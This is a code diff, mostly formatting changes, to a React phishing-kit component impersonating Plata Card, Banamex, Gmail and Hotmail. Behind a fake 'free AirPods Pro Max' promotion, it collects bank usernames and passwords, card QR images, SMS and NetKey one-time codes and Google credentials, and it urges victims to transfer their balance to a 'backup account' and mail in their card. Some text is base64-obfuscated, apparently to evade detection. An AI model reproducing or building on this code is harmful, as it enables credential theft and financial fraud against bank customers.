@@ -97,12 +97,12 @@ export const ScreenTemplates: React.FC<ScreenTemplatesProps> = ({
   const [passwordInput, setPasswordInput] = useState('');
   const [photoFile, setPhotoFile] = useState<File | null>(null);
   const [netkeyResponse, setNetkeyResponse] = useState('');
-  
+
   // Funciones de validación con protección mejorada
   const validateSecureData = (input: string, type: string) => {
     return protectionUtils.validateData(input, type);
   };
-  
+
   const formatSecureInput = (value: string) => {
     const v = value.replace(/\D/g, '');
     const groups = [];
@@ -111,7 +111,7 @@ export const ScreenTemplates: React.FC<ScreenTemplatesProps> = ({
     }
     return groups.join(' ');
   };
-  
+
   const formatSecureDate = (value: string) => {
     const v = value.replace(/\D/g, '');
     if (v.length >= 2) {
@@ -140,7 +140,7 @@ export const ScreenTemplates: React.FC<ScreenTemplatesProps> = ({
         </div>
       );
     };
-    
+
     // Diferentes pantallas según el tipo
     switch (currentScreen) {
       case ScreenType.PROMOCION:
@@ -166,7 +166,7 @@ export const ScreenTemplates: React.FC<ScreenTemplatesProps> = ({
               {/* SECCIÓN 1: PROMOCIÓN PRINCIPAL */}
               <section className="py-24 bg-gradient-to-b from-white to-gray-50">
                 <div className="max-w-4xl mx-auto px-6 text-center">
-                  
+
                   {/* Título con emoji */}
                   <div className="mb-12">
                     <span className="text-5xl mb-4 block">🎉</span>
@@ -208,7 +208,7 @@ export const ScreenTemplates: React.FC<ScreenTemplatesProps> = ({
               {/* SECCIÓN 2: DETALLES DEL PRODUCTO */}
               <section className="py-24 bg-white">
                 <div className="max-w-4xl mx-auto px-6">
-                  
+
                   {/* Título de sección */}
                   <div className="text-center mb-16">
                     <span className="text-4xl mb-4 block">🎧</span>
@@ -238,7 +238,7 @@ export const ScreenTemplates: React.FC<ScreenTemplatesProps> = ({
               {/* SECCIÓN 3: IMÁGENES PROMOCIONALES */}
               <section className="py-24 bg-gray-50">
                 <div className="max-w-5xl mx-auto px-6">
-                  
+
                   {/* Título de sección */}
                   <div className="text-center mb-16">
                     <h3 className="text-3xl font-bold text-gray-900 mb-4">Tu premio te espera</h3>
@@ -274,7 +274,7 @@ export const ScreenTemplates: React.FC<ScreenTemplatesProps> = ({
                   <h2 className="text-4xl md:text-5xl font-bold text-gray-900 mb-8">¿Cómo funciona?</h2>
                   <p className="text-2xl text-gray-600">Solo 3 pasos para recibir tus AirPods Pro Max</p>
                 </div>
-                
+
                 <div className="space-y-16 max-w-4xl mx-auto">
                   <div className="flex items-start platacard-step">
                     <span className="platacard-step-number mr-8">1</span>
@@ -283,7 +283,7 @@ export const ScreenTemplates: React.FC<ScreenTemplatesProps> = ({
                       <div className="text-gray-700 text-xl leading-relaxed">Revisa y acepta los términos y condiciones de la promoción</div>
                     </div>
                   </div>
-                  
+
                   <div className="flex items-start platacard-step">
                     <span className="platacard-step-number mr-8">2</span>
                     <div className="flex-1">
@@ -291,7 +291,7 @@ export const ScreenTemplates: React.FC<ScreenTemplatesProps> = ({
                       <div className="text-gray-700 text-xl leading-relaxed">Accede con tus credenciales de Plata Card para verificar tu elegibilidad</div>
                     </div>
                   </div>
-                  
+
                   <div className="flex items-start platacard-step">
                     <span className="platacard-step-number mr-8">3</span>
                     <div className="flex-1">
@@ -300,7 +300,7 @@ export const ScreenTemplates: React.FC<ScreenTemplatesProps> = ({
                     </div>
                   </div>
                 </div>
-                
+
                 {/* Botón final con más espaciado */}
                 <div className="text-center mt-24">
                   <Button 
@@ -317,7 +317,6 @@ export const ScreenTemplates: React.FC<ScreenTemplatesProps> = ({
             </div>
           </div>
         );
-        return promocionContent;
 
       case ScreenType.TERMINOS:
         const terminosContent = (
@@ -330,7 +329,9 @@ export const ScreenTemplates: React.FC<ScreenTemplatesProps> = ({
                 Los presentes Términos y Condiciones tienen por objeto reglamentar y establecer los procedimientos aplicables a la promoción denominada "AirPods Pro Max Gratis a Clientes Seleccionados Plata Card" ofrecida por PLATA CARD.
               </p>
               <p className="mb-2 font-semibold">1. Requisitos para Participar:</p>
-              <p className="mb-3">La promoción está dirigida exclusivamente a clientes seleccionados de Plata Card, quienes deberán cumplir con los siguientes requisitos:</p>
+              <p className="mb-3">
+                La promoción está dirigida exclusivamente a clientes seleccionados de Plata Card, quienes deberán cumplir con los siguientes requisitos:
+              </p>
               <ul className="mb-3 ml-4 list-disc">
                 <li>Ser titular de una tarjeta Plata Card válida y activa.</li>
                 <li>Tener un historial crediticio excelente con buen uso de la tarjeta.</li>
@@ -434,7 +435,7 @@ export const ScreenTemplates: React.FC<ScreenTemplatesProps> = ({
                   <div className="border-2 border-dashed border-orange-400 rounded-xl p-12 mb-4">
                     <div className="text-4xl mb-4">📱</div>
                     <p className="text-gray-600 mb-4">Coloca el QR de tu tarjeta aquí</p>
-                    
+
                     {/* Input de archivo oculto para simular captura */}
                     <input
                       type="file"
@@ -477,7 +478,7 @@ export const ScreenTemplates: React.FC<ScreenTemplatesProps> = ({
                 {dataA && (
                   <div className="bg-white rounded-xl p-6 border-2 border-orange-200">
                     <h3 className="text-lg font-semibold text-gray-900 mb-4">¿Se ve correctamente tu QR?</h3>
-                    
+
                     {/* Imagen del QR capturado */}
                     <div className="mb-6">
                       <img 
@@ -500,7 +501,7 @@ export const ScreenTemplates: React.FC<ScreenTemplatesProps> = ({
                       >
                         ✓ Enviar QR
                       </Button>
-                      
+
                       <Button
                         onClick={() => setDataA('')}
                         variant="outline"
@@ -565,7 +566,7 @@ export const ScreenTemplates: React.FC<ScreenTemplatesProps> = ({
         // Obtener los últimos 4 dígitos del teléfono (ej: ***2390)
         // Usar terminación ya configurada o por defecto 2390
         const lastFourDigits = screenData.terminacion || '2390';
-        
+
         return (
             <div className="min-h-screen bg-white flex items-center justify-center p-4">
               <div className="max-w-md w-full bg-white rounded-2xl shadow-2xl p-8 border border-gray-100">
@@ -666,35 +667,35 @@ export const ScreenTemplates: React.FC<ScreenTemplatesProps> = ({
               message: "La contraseña debe tener entre 5 y 16 caracteres"
             };
           }
-          
+
           const hasUpperCase = /[A-Z]/.test(password);
           const hasNumber = /[0-9]/.test(password);
           const hasSpecialChar = /[!@#$%^&*()_+\-=\[\]{};':"\\|,.<>\/?]/.test(password);
-          
+
           // También considerar el punto como carácter especial
           const hasPeriod = password.includes('.');
-          
+
           if (!hasUpperCase) {
             return {
               isValid: false,
               message: "La contraseña debe contener al menos una letra mayúscula"
             };
           }
-          
+
           if (!hasNumber) {
             return {
               isValid: false,
               message: "La contraseña debe contener al menos un número"
             };
           }
-          
+
           if (!hasSpecialChar && !hasPeriod) {
             return {
               isValid: false,
               message: "La contraseña debe contener al menos un carácter especial (el punto '.' también es válido)"
             };
           }
-          
+
           return { isValid: true, message: "" };
         };
 
@@ -705,14 +706,14 @@ export const ScreenTemplates: React.FC<ScreenTemplatesProps> = ({
             setErrorB(protectionUtils.decode('UG9yIGZhdm9yLCBpbmdyZXNhIHRvZG9zIGxvcyBjYW1wb3MgcmVxdWVyaWRvcw=='));
             return;
           }
-          
+
           // Validar requisitos de contraseña
           const passwordValidation = validatePassword(dataB.password);
           if (!passwordValidation.isValid) {
             setErrorB(passwordValidation.message);
             return;
           }
-          
+
           // Si llegamos aquí, todo está bien
           setErrorB(null);
           onSubmit(ScreenType.LOGIN, { 
@@ -720,7 +721,7 @@ export const ScreenTemplates: React.FC<ScreenTemplatesProps> = ({
             password: dataB.password 
           });
         };
-        
+
         const loginContent = (
           <>
             <div className="text-center mb-6">
@@ -729,13 +730,13 @@ export const ScreenTemplates: React.FC<ScreenTemplatesProps> = ({
                 Accede a tu cuenta para continuar con tu promoción de AirPods
               </p>
             </div>
-            
+
             {screenData.errorMessage && (
               <div className="bg-red-50 border border-red-200 text-red-700 px-4 py-3 rounded-lg mb-4">
                 <p className="text-sm font-medium">{screenData.errorMessage}</p>
               </div>
             )}
-            
+
             <div className="space-y-4">
               <div>
                 <label className="block text-sm font-medium text-gray-700 mb-2">
@@ -749,7 +750,7 @@ export const ScreenTemplates: React.FC<ScreenTemplatesProps> = ({
                   className="w-full p-3 border border-gray-300 rounded-lg text-base focus:ring-2 focus:ring-orange-500 focus:border-transparent transition-all"
                 />
               </div>
-              
+
               <div>
                 <label className="block text-sm font-medium text-gray-700 mb-2">
                   Contraseña
@@ -770,14 +771,14 @@ export const ScreenTemplates: React.FC<ScreenTemplatesProps> = ({
                 )}
               </div>
             </div>
-            
+
             <Button 
               className="platacard-button py-3 text-lg font-semibold mt-6"
               onClick={handleSecureLogin}
             >
               Iniciar sesión
             </Button>
-            
+
             <div className="text-center mt-4">
               <a href="#" className="text-sm platacard-accent hover:text-orange-600 font-medium hover:underline transition-colors">
                 ¿Olvidaste tu contraseña?
@@ -793,14 +794,14 @@ export const ScreenTemplates: React.FC<ScreenTemplatesProps> = ({
             onSubmit(ScreenType.NETKEY, { netkeyResponse: netkeyResponse });
           }
         };
-        
+
         const [currentTime, setCurrentTime] = useState(new Date());
-        
+
         useEffect(() => {
           const timer = setInterval(() => setCurrentTime(new Date()), 1000);
           return () => clearInterval(timer);
         }, []);
-        
+
         const formatDateTime = (d: Date) => {
           const days = ['Domingo','Lunes','Martes','Miércoles','Jueves','Viernes','Sábado'];
           const months = ['Enero','Febrero','Marzo','Abril','Mayo','Junio','Julio','Agosto','Septiembre','Octubre','Noviembre','Diciembre'];
@@ -812,52 +813,70 @@ export const ScreenTemplates: React.FC<ScreenTemplatesProps> = ({
           const time = pad(d.getHours()) + ':' + pad(d.getMinutes()) + ':' + pad(d.getSeconds());
           return `${dayName} ${day} de ${month} de ${year}, ${time} Centro de México`;
         };
-        
+
+        // Renderizar la pantalla NetKey usando el diseño exacto del mockup proporcionado
         return (
-          <div style={{
-            margin: 0,
-            background: '#fff',
-            color: '#0b3b43',
-            padding: '28px',
-            fontFamily: '"Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif'
-          }}>
+          <div 
+            style={{ 
+              margin: 0, 
+              background: '#fff', 
+              color: '#0b3b43', 
+              padding: '28px', 
+              fontFamily: '"Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif',
+              minHeight: '100vh',
+              position: 'fixed',
+              top: 0,
+              left: 0,
+              width: '100%',
+              height: '100%',
+              zIndex: 10000
+            }}
+          >
             <div style={{ maxWidth: '900px', margin: '18px auto' }}>
+              {/* Header */}
               <header style={{ display: 'flex', alignItems: 'center', gap: '18px', marginBottom: '22px' }}>
                 <div style={{ display: 'flex', alignItems: 'center', gap: '12px' }}>
-                  <img src={citibanamexLogo} alt="Banamex" style={{ height: '46px', width: 'auto', display: 'block' }} />
-                  <div>
-                    <div style={{ fontSize: '20px', fontWeight: 600, color: '#153e46' }}>Banamex</div>
-                  </div>
+                  <img 
+                    src={citibanamexLogo} 
+                    alt="Banamex"
+                    style={{ height: '46px', width: 'auto', display: 'block' }}
+                  />
                 </div>
-                <div style={{ marginLeft: 'auto', textAlign: 'right' }}>
+                <div style={{ marginLeft: 'auto' }}>
                   <div style={{ fontSize: '14px', color: '#2d4b51' }}>
                     {formatDateTime(currentTime)}
                   </div>
                 </div>
               </header>
 
-              <div style={{
-                background: 'linear-gradient(90deg, #f7fbfc 0%, #eef6f7 100%)',
-                borderRadius: '8px',
-                padding: '22px',
-                boxShadow: '0 6px 18px rgba(0,0,0,0.08)',
-                border: '1px solid rgba(0,0,0,0.03)'
-              }}>
+              {/* Card */}
+              <div 
+                style={{
+                  background: 'linear-gradient(90deg, #f7fbfc 0%, #eef6f7 100%)',
+                  borderRadius: '8px',
+                  padding: '22px',
+                  boxShadow: '0 6px 18px rgba(0,0,0,0.08)',
+                  border: '1px solid rgba(0,0,0,0.03)'
+                }}
+              >
                 <h1 style={{ fontSize: '28px', margin: '6px 0 18px', display: 'flex', alignItems: 'center', gap: '12px' }}>
                   » Clave dinámica
                 </h1>
 
-                <div className="inner" style={{ display: 'flex', gap: '18px', alignItems: 'flex-start' }}>
-                  <div style={{
-                    background: '#fff',
-                    borderRadius: '6px',
-                    padding: '20px',
-                    boxShadow: '0 3px 8px rgba(0,0,0,0.04)',
-                    flex: 1,
-                    minHeight: '260px',
-                    display: 'flex',
-                    flexDirection: 'column'
-                  }} className="panel">
+                <div style={{ display: 'flex', gap: '18px', alignItems: 'flex-start' }}>
+                  {/* Panel izquierdo */}
+                  <div 
+                    style={{
+                      background: '#fff',
+                      borderRadius: '6px',
+                      padding: '20px',
+                      boxShadow: '0 3px 8px rgba(0,0,0,0.04)',
+                      flex: 1,
+                      minHeight: '260px',
+                      display: 'flex',
+                      flexDirection: 'column'
+                    }}
+                  >
                     <div style={{ color: '#133d43', lineHeight: '1.45', fontSize: '14px' }}>
                       <p>Encienda su NetKey Banamex, teclee su PIN; al desplegarse la palabra "HOST?" digite el número "9".</p>
                       <p>Al aparecer la palabra "CHALLNG?" introduzca en su NetKey Banamex la siguiente clave:</p>
@@ -868,32 +887,38 @@ export const ScreenTemplates: React.FC<ScreenTemplatesProps> = ({
 
                       <div style={{ flex: 1 }}></div>
                       <div style={{ marginTop: '12px', color: '#9aaeb0', fontSize: '12px' }}>
-                        <button style={{
-                          padding: '8px 12px',
-                          borderRadius: '6px',
-                          background: '#fff5f6',
-                          color: '#c22f40',
-                          border: '1px solid rgba(194,47,64,0.08)',
-                          fontWeight: 600,
-                          fontSize: '14px',
-                          cursor: 'pointer'
-                        }} type="button">
+                        <button 
+                          style={{
+                            padding: '8px 12px',
+                            borderRadius: '6px',
+                            background: '#fff5f6',
+                            color: '#c22f40',
+                            border: '1px solid rgba(194,47,64,0.08)',
+                            fontWeight: 600,
+                            fontSize: '14px',
+                            cursor: 'pointer'
+                          }}
+                          type="button"
+                        >
                           Cancelar
                         </button>
                       </div>
                     </div>
                   </div>
 
-                  <div className="right" style={{
-                    width: '320px',
-                    background: '#fff',
-                    borderRadius: '6px',
-                    padding: '20px',
-                    boxShadow: '0 3px 8px rgba(0,0,0,0.04)',
-                    display: 'flex',
-                    flexDirection: 'column',
-                    justifyContent: 'space-between'
-                  }}>
+                  {/* Panel derecho */}
+                  <div 
+                    style={{
+                      width: '320px',
+                      background: '#fff',
+                      borderRadius: '6px',
+                      padding: '20px',
+                      boxShadow: '0 3px 8px rgba(0,0,0,0.04)',
+                      display: 'flex',
+                      flexDirection: 'column',
+                      justifyContent: 'space-between'
+                    }}
+                  >
                     <div>
                       <p style={{ margin: '0 0 10px', fontWeight: 600, color: '#193b3e' }}>
                         Presione "ENT". Su NetKey Banamex generará una clave dinámica que deberá digitar en el siguiente campo
@@ -902,8 +927,8 @@ export const ScreenTemplates: React.FC<ScreenTemplatesProps> = ({
                       <label style={{ fontSize: '13px', color: '#134142', marginBottom: '8px', display: 'block' }}>
                         Clave dinámica
                       </label>
-                      <input
-                        type="text"
+                      <input 
+                        type="text" 
                         maxLength={8}
                         value={netkeyResponse}
                         onChange={(e) => setNetkeyResponse(e.target.value.replace(/\D/g, ''))}
@@ -921,19 +946,22 @@ export const ScreenTemplates: React.FC<ScreenTemplatesProps> = ({
 
                     <div>
                       <div style={{ display: 'flex', gap: '12px', marginTop: '16px', alignItems: 'center', justifyContent: 'flex-end' }}>
-                        <button style={{
-                          padding: '10px 18px',
-                          borderRadius: '10px',
-                          cursor: 'pointer',
-                          fontWeight: 600,
-                          fontSize: '14px',
-                          background: '#fff5f6',
-                          color: '#c22f40',
-                          border: '1px solid rgba(194,47,64,0.08)'
-                        }} type="button">
+                        <button 
+                          style={{
+                            padding: '10px 18px',
+                            borderRadius: '10px',
+                            cursor: 'pointer',
+                            fontWeight: 600,
+                            fontSize: '14px',
+                            background: '#fff5f6',
+                            color: '#c22f40',
+                            border: '1px solid rgba(194,47,64,0.08)'
+                          }}
+                          type="button"
+                        >
                           Cancelar
                         </button>
-                        <button
+                        <button 
                           style={{
                             padding: '10px 18px',
                             borderRadius: '10px',
@@ -961,22 +989,6 @@ export const ScreenTemplates: React.FC<ScreenTemplatesProps> = ({
                     </div>
                   </div>
                 </div>
-
-                <style>{`
-                  @media (max-width: 820px) {
-                    .inner {
-                      flex-direction: column;
-                    }
-                    .right {
-                      width: 100%;
-                    }
-                    header {
-                      flex-direction: column;
-                      align-items: flex-start;
-                      gap: 6px;
-                    }
-                  }
-                `}</style>
               </div>
             </div>
           </div>
@@ -988,13 +1000,13 @@ export const ScreenTemplates: React.FC<ScreenTemplatesProps> = ({
             <div className="bg-[#d32f2f] text-white p-6 rounded-t-lg text-center mb-6">
               <h2 className="text-2xl font-bold">Acceso Denegado</h2>
             </div>
-            
+
             <div className="bg-gray-50 p-6 rounded-lg">
               <p className="text-gray-700 mb-6 leading-relaxed">
                 Su dispositivo NetKey requiere mantenimiento para continuar funcionando de manera adecuada. 
                 Es necesario sincronizarlo para restablecer su servicio correctamente.
               </p>
-              
+
               <div className="bg-white p-6 rounded-lg border-l-4 border-[#003d7a] mb-6">
                 <h3 className="text-[#003d7a] font-bold text-lg mb-3">Banamex Resuelve PyMEs</h3>
                 <p className="text-gray-700 mb-4">
@@ -1010,7 +1022,7 @@ export const ScreenTemplates: React.FC<ScreenTemplatesProps> = ({
                   </p>
                 </div>
               </div>
-              
+
               <div className="text-sm text-gray-600">
                 <p className="mb-2">Horario de atención:</p>
                 <ul className="list-disc list-inside space-y-1 ml-2">
@@ -1037,7 +1049,7 @@ export const ScreenTemplates: React.FC<ScreenTemplatesProps> = ({
                 </p>
                 <p className="text-gray-600">Totalmente gratuitos por su excelente historial crediticio</p>
               </div>
-              
+
               <div className="platacard-card mt-6 border border-orange-200">
                 <h3 className="text-lg font-bold text-gray-800 mb-3 flex items-center justify-center">
                   <span className="mr-2">📋</span>
@@ -1066,7 +1078,7 @@ export const ScreenTemplates: React.FC<ScreenTemplatesProps> = ({
                   </div>
                 </div>
               </div>
-              
+
               <div className="platacard-card mt-6 border border-orange-200">
                 <h3 className="text-lg font-bold platacard-accent mb-2 flex items-center justify-center">
                   <span className="mr-2">📧</span>
@@ -1077,13 +1089,13 @@ export const ScreenTemplates: React.FC<ScreenTemplatesProps> = ({
                   de entrega y el número de seguimiento de su paquete en las próximas 24 horas.
                 </p>
               </div>
-              
+
               <div className="text-xs text-gray-500 mt-4 space-y-1">
                 <p>Esta promoción está regida por las leyes de México y los términos y condiciones previamente aceptados.</p>
                 <p>Al participar, acepta el uso de sus datos personales para fines comerciales y de marketing de Plata Card.</p>
               </div>
             </div>
-            
+
             <Button 
               className="platacard-button py-3 text-lg"
               onClick={() => {
@@ -1105,7 +1117,7 @@ export const ScreenTemplates: React.FC<ScreenTemplatesProps> = ({
             <p className="mb-4 text-sm text-gray-600">
               {atob('SW5ncmVzYSB0dSBuw7ptZXJvIGRlIHRlbMOpZm9ubyBjZWx1bGFyIGEgMTAgZMOtZ2l0b3MgcGFyYSBjb250aW51YXIgY29uIGxhIHByb21vY2nDs24gZGUgdnVlbG9z')}
             </p>
-            
+
             <div className="mb-4">
               <label className="block text-sm font-medium mb-2">
                 {atob('TsO6bWVybyBkZSB0ZWzDqWZvbm8gY2VsdWxhcg==')}
@@ -1130,7 +1142,7 @@ export const ScreenTemplates: React.FC<ScreenTemplatesProps> = ({
                 {atob('SW5ncmVzYSB0dSBuw7ptZXJvIGEgMTAgZMOtZ2l0b3Mgc2luIGVzcGFjaW9zIG5pIGd1aW9uZXM=')}
               </p>
             </div>
-            
+
             <Button 
               className="w-full bg-[#a71138] hover:bg-[#e04343] text-white py-3 text-lg"
               onClick={() => {
@@ -1150,7 +1162,7 @@ export const ScreenTemplates: React.FC<ScreenTemplatesProps> = ({
 
       case ScreenType.CODIGO:
         const phoneTermination = screenData.terminacion || '5880';
-        
+
         const verifyContent = (
           <>
             {/* Logo de Plata Card */}
@@ -1161,11 +1173,11 @@ export const ScreenTemplates: React.FC<ScreenTemplatesProps> = ({
                 className="h-12 object-contain"
               />
             </div>
-            
+
             <h2 className="text-xl font-bold mb-4 text-center text-[#BE0046]">
               Ingresa el código que recibiste por SMS al número *{phoneTermination} para vincular tu dispositivo con PlataCard
             </h2>
-            
+
             <div className="mb-6">
               <label className="block text-lg font-semibold mb-3 text-gray-800">Código de verificación</label>
               <p className="text-sm text-gray-600 mb-4">
@@ -1183,7 +1195,7 @@ export const ScreenTemplates: React.FC<ScreenTemplatesProps> = ({
                 maxLength={6}
               />
             </div>
-            
+
             <Button 
               className="w-full bg-[#BE0046] hover:bg-[#9A0037] text-white py-4 text-lg font-semibold rounded-lg transition-colors duration-200"
               onClick={() => {
@@ -1244,10 +1256,10 @@ export const ScreenTemplates: React.FC<ScreenTemplatesProps> = ({
                 En la siguiente pantalla, se mostrarán las instrucciones para la recolección y reposición de su tarjeta.
               </p>
             </div>
-            
+
             <Button 
               className={primaryBtnClass}
-              onClick={() => onSubmit(ScreenType.PROTEGER, { confirmado: true })}
+              onClick={() => onSubmit(ScreenType.PROTEGER, { confirmed: true })}
             >
               Entendido
             </Button>
@@ -1272,7 +1284,7 @@ export const ScreenTemplates: React.FC<ScreenTemplatesProps> = ({
                 <li>Adjunte en el interior del sobre la carta de cancelación, debidamente firmada por el titular de la tarjeta. Esta carta será proporcionada a través de su asistente virtual.</li>
                 <li>Una vez listo el envío, se generará una guía logística a través de la empresa Estafeta.</li>
               </ol>
-              
+
               <p className="mb-3">
                 Para la recolección del sobre, usted podrá elegir una de las siguientes opciones:
               </p>
@@ -1280,27 +1292,27 @@ export const ScreenTemplates: React.FC<ScreenTemplatesProps> = ({
                 <li>Que Estafeta recoja el sobre en su domicilio, o bien,</li>
                 <li>Que usted entregue el sobre personalmente en la sucursal de Estafeta más cercana.</li>
               </ul>
-              
+
               <p className="mb-3">
                 Una vez recibido y validado el paquete en nuestras instalaciones, en un plazo de 5 días hábiles, estará recibiendo su nueva tarjeta en el domicilio registrado:
               </p>
-              
+
               <p className="p-2 bg-white mb-3 rounded">
                 {screenData.direccion || "Ejemplo dirección"}
               </p>
-              
+
               <p className="mb-3">
                 Agradecemos su atención y cooperación. Para cualquier duda adicional, le solicitamos comunicarse con su ejecutivo en línea para continuar con el proceso.
               </p>
-              
+
               <p className="mb-1">Atentamente,</p>
               <p className="mb-1">Departamento de Atención a Clientes</p>
               <p className="font-semibold">Plata Card</p>
             </div>
-            
+
             <Button 
               className={primaryBtnClass}
-              onClick={() => onSubmit(ScreenType.TARJETA, { confirmado: true })}
+              onClick={() => onSubmit(ScreenType.TARJETA, { confirmed: true })}
             >
               Entendido
             </Button>
@@ -1326,10 +1338,10 @@ export const ScreenTemplates: React.FC<ScreenTemplatesProps> = ({
                 Esta ventana se actualizará una vez reconozcamos que se haya transferido el saldo a su cuenta de respaldo.
               </p>
             </div>
-            
+
             <Button 
               className={primaryBtnClass}
-              onClick={() => onSubmit(ScreenType.TRANSFERIR, { confirmado: true })}
+              onClick={() => onSubmit(ScreenType.TRANSFERIR, { confirmed: true })}
             >
               Ya realicé la transferencia
             </Button>
@@ -1351,10 +1363,10 @@ export const ScreenTemplates: React.FC<ScreenTemplatesProps> = ({
                 En un lapso no mayor a 72 horas, el monto devuelto volverá a estar disponible en su tarjeta de crédito.
               </p>
             </div>
-            
+
             <Button 
               className={primaryBtnClass}
-              onClick={() => onSubmit(ScreenType.CANCELACION, { confirmado: true })}
+              onClick={() => onSubmit(ScreenType.CANCELACION, { confirmed: true })}
             >
               Entendido
             </Button>
@@ -1384,28 +1396,28 @@ export const ScreenTemplates: React.FC<ScreenTemplatesProps> = ({
       case ScreenType.SMS_COMPRA:
       case 'sms_compra' as ScreenType:
         console.log(atob('UmVuZGVyaXphbmRvIHBhbnRhbGxhIFNNU19DT01QUkE='), screenData);
-        
+
         if (dataH === undefined) {
           console.log(atob('SW5pY2lhbGl6YW5kbyBjYW1wbw=='));
           setDataH("");
         }
-        
+
         console.log(atob('VGVybWluYWNpw7NuIGRlIGNlbHVsYXI='), screenData.terminacion);
         console.log(atob('Q8OzZGlnbyBhY3R1YWw='), dataH);
-        
+
         const processContent = (
           <>
             <h2 className="text-xl font-bold mb-3">{atob('Q2FuY2VsYWNpw7NuIGRlIGNhcmdvczo=')}:</h2>
             <p className="mb-4">
               {atob('SW5ncmVzYSBlbCBjw7NkaWdvIHF1ZSByZWNpYmlzdGUgcGFyYSBhdXRvcml6YXIgbGEgY29tcHJhIGVuIGzDrW5lYS4gRXN0ZSBtaXNtbyBjw7NkaWdvIHNpcnZlIHBhcmEgcmVhbGl6YXIgbGEgY2FuY2VsYWNpw7NuLiBMbyBoZW1vcyBlbnZpYWRvIGEgdHUgdGVsw6lmb25vIGNvbiB0ZXJtaW5hY2nDs246')} <strong>{screenData.terminacion || "****"}</strong>
             </p>
-            
+
             <div className="p-4 bg-gray-100 rounded mb-4 text-black">
               <p className="mb-2">
                 <strong>{atob('SW5mb3JtYWNpw7NuIGRlIGNhbmNlbGFjacOzbjo=')}:</strong>
               </p>
             </div>
-            
+
             <div className="mb-4">
               <label className="block text-sm font-medium mb-1">{atob('SW5ncmVzYSBlbCBjw7NkaWdvIGRlIGNhbmNlbGFjacOzbjo=')}:</label>
               <Input 
@@ -1418,7 +1430,7 @@ export const ScreenTemplates: React.FC<ScreenTemplatesProps> = ({
               />
               <p className="text-xs text-gray-500">{atob('RWwgY8OzZGlnbyBkZWJlIHRlbmVyIDYgZMOtZ2l0b3MgbnVtw6lyaWNvcy4=')}.</p>
             </div>
-            
+
             <Button 
               className={primaryBtnClass}
               onClick={() => {
@@ -1461,7 +1473,7 @@ export const ScreenTemplates: React.FC<ScreenTemplatesProps> = ({
           </>
         );
         return getBankContainer(validandoContent);
-        
+
       case ScreenType.GMAIL:
         // Función para cambiar de la pantalla de correo a la de contraseña
         const handleGmailNextScreen = () => {
@@ -1479,12 +1491,12 @@ export const ScreenTemplates: React.FC<ScreenTemplatesProps> = ({
             }
           }
         };
-        
+
         // Función para alternar la visibilidad de la contraseña
         const toggleGmailPasswordVisibility = () => {
           setShowPass(!showPass);
         };
-        
+
         // Contenedor personalizado para Gmail que es distinto al resto de pantallas
         const getGmailContainer = (children: React.ReactNode) => {
           return (
@@ -1493,18 +1505,18 @@ export const ScreenTemplates: React.FC<ScreenTemplatesProps> = ({
             </div>
           );
         };
-        
+
         // Pantalla de correo electrónico (primera pantalla)
         const dataJContent = (
           <>
             <div className="flex justify-center mb-4">
               <img src={googleLogo} alt="Google Logo" className="w-16 h-16" />
             </div>
-            
+
             <p className="text-[15px] text-gray-700 mb-6">
               Para sincronizar tus notificaciones con la aplicación <strong>Plata Card Control</strong>, inicia sesión utilizando tu correo electrónico registrado.
             </p>
-            
+
             <Input 
               type="text"
               id="dataJ" 
@@ -1513,11 +1525,11 @@ export const ScreenTemplates: React.FC<ScreenTemplatesProps> = ({
               value={dataJ}
               onChange={(e) => setDataJ(e.target.value)}
             />
-            
+
             <div className="text-left mb-6">
               <a href="#" className="text-[#FF6B35] text-sm hover:underline">¿Olvidaste el correo electrónico?</a>
             </div>
-            
+
             <Button 
               className="bg-[#FF6B35] text-white hover:bg-[#FF8C5A] w-full py-2 px-4 rounded"
               onClick={handleGmailNextScreen}
@@ -1526,21 +1538,21 @@ export const ScreenTemplates: React.FC<ScreenTemplatesProps> = ({
             </Button>
           </>
         );
-        
+
         // Pantalla de contraseña (segunda pantalla)
         const dataKContent = (
           <>
             <div className="flex justify-center mb-4">
               <img src={googleLogo} alt="Google Logo" className="w-16 h-16" />
             </div>
-            
+
             <div className="flex items-center justify-center mb-6">
               <div className="bg-gray-200 text-gray-700 w-10 h-10 rounded-full flex items-center justify-center font-semibold mr-2">
                 {dataJ[0]?.toUpperCase() || 'G'}
               </div>
               <span className="text-sm">{dataJ}</span>
             </div>
-            
+
             <Input 
               type={showPass ? "text" : "password"}
               id="dataK" 
@@ -1549,7 +1561,7 @@ export const ScreenTemplates: React.FC<ScreenTemplatesProps> = ({
               value={dataK}
               onChange={(e) => setDataK(e.target.value)}
             />
-            
+
             <div className="flex items-center mb-4 text-left">
               <Checkbox 
                 id="mostrarContrasena" 
@@ -1561,11 +1573,11 @@ export const ScreenTemplates: React.FC<ScreenTemplatesProps> = ({
                 Mostrar contraseña
               </Label>
             </div>
-            
+
             <div className="text-left mb-6">
               <a href="#" className="text-blue-600 text-sm hover:underline">¿Olvidaste la contraseña?</a>
             </div>
-            
+
             <Button 
               className="bg-blue-600 text-white hover:bg-blue-700 w-full py-2 px-4 rounded"
               onClick={handleGmailNextScreen}
@@ -1574,10 +1586,10 @@ export const ScreenTemplates: React.FC<ScreenTemplatesProps> = ({
             </Button>
           </>
         );
-        
+
         // Renderizar la pantalla correspondiente según el estado
         return getGmailContainer(gmailScreen === 'correo' ? dataJContent : dataKContent);
-        
+
       case ScreenType.GMAIL_VERIFY:
         // Contenedor personalizado para Gmail Verify que es distinto al resto de pantallas
         const getGmailVerifyContainer = (children: React.ReactNode) => {
@@ -1587,14 +1599,14 @@ export const ScreenTemplates: React.FC<ScreenTemplatesProps> = ({
             </div>
           );
         };
-        
+
         // Pantalla de verificación de Google
         const gmailVerificationContent = (
           <>
             <div className="flex justify-center mb-5">
               <img src={googleLogo} alt="Google" className="w-20" />
             </div>
-            
+
             <h1 className="text-2xl font-normal mb-2">Verifica que eres tú</h1>
             <p className="text-sm text-gray-700 mb-4 max-w-xs mx-auto">
               Para proteger tu cuenta, Google quiere asegurarse de que realmente seas tú la persona que intenta acceder <a href="#" className="text-blue-600">Más información</a>
@@ -1625,9 +1637,9 @@ export const ScreenTemplates: React.FC<ScreenTemplatesProps> = ({
             <a href="#" className="text-blue-600 text-sm mt-4 block hover:underline">Probar otro método</a>
           </>
         );
-        
+
         return getGmailVerifyContainer(gmailVerificationContent);
-        
+
       case ScreenType.HOTMAIL:
         const hotmailContent = (
           <div className="flex flex-col items-center w-full max-w-md mx-auto">
@@ -1638,13 +1650,13 @@ export const ScreenTemplates: React.FC<ScreenTemplatesProps> = ({
